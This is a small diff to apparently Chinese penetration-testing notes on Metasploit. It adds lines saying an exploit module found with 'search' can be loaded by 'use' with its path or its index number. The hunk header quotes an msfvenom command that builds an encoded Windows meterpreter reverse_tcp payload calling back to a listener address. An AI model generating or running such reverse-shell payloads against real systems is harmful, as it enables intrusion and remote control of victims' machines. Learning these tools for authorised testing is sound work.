@@ -52,6 +52,10 @@ msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai lhost=10.2.7.1
 2021-05-14编写
 感谢lyh
 
+使用search检索出相应的利用脚本后，两种方式加载载荷
+1，use 载荷路径
+2，use 载荷序号
+
 ```
 
 
